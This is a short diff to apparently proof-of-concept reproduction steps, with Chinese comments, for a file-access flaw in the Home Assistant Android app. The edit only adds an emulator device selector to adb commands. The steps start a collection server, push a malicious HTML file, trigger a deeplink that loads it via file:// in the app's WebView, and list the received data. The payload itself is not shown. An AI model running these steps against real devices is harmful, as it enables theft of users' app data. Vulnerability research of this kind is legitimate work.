@@ -39,11 +39,10 @@ cd exp/home-assistant/2.1.1_File_Access_Misconfiguration
 python server.py
 
 # 2. 下载恶意 HTML 到模拟器
-adb push exp/2.1.1.html /sdcard/Download/exploit.html
+adb -s 127.0.0.1:7555 push exp/2.1.1.html /sdcard/Download/exploit.html
 
 # 3. 触发 Deeplink（加载本地 file:// 页面）
-adb shell am start -a android.intent.action.VIEW \
-  -d "homeassistant://webview?url=file:///sdcard/Download/exploit.html"
+adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=file:///sdcard/Download/exploit.html"
 
 # 4. 查看回收数据
 dir received\
